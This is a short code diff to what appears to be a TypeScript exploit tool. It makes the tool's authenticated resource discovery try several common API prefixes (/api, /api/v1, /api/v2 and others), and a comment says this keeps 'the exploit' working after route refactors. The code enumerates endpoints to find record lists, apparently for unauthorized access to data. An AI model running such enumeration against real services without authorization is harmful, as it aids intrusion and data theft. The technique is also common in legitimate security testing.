@@ -126,19 +126,25 @@ export async function tryLogin(base: string, path: string, u: AppUser): Promise<
   return { label: "", userId, token, records: [] };
 }
 
+// Common API prefixes so a route moved to /api/v2/items is still re-found.
+// This is what makes the exploit self-relocating across a refactor.
+const PATH_PREFIXES = ["", "/api", "/api/v1", "/api/v2", "/v1", "/v2", "/api/v3"];
+
 export async function discoverList(base: string, token: string): Promise<{ listPath: string; records: any[] } | null> {
-  for (const name of RESOURCE_DICT) {
-    const listPath = "/" + name;
-    const r = await send("GET", base + listPath, token);
-    if (r.status !== 200) continue;
-    let body: any;
-    try {
-      body = JSON.parse(r.body);
-    } catch {
-      continue;
+  for (const prefix of PATH_PREFIXES) {
+    for (const name of RESOURCE_DICT) {
+      const listPath = prefix + "/" + name;
+      const r = await send("GET", base + listPath, token);
+      if (r.status !== 200) continue;
+      let body: any;
+      try {
+        body = JSON.parse(r.body);
+      } catch {
+        continue;
+      }
+      const arr = extractArray(body);
+      if (arr && arr.some((x) => x && x.id !== undefined)) return { listPath, records: arr };
     }
-    const arr = extractArray(body);
-    if (arr && arr.some((x) => x && x.id !== undefined)) return { listPath, records: arr };
   }
   return null;
 }
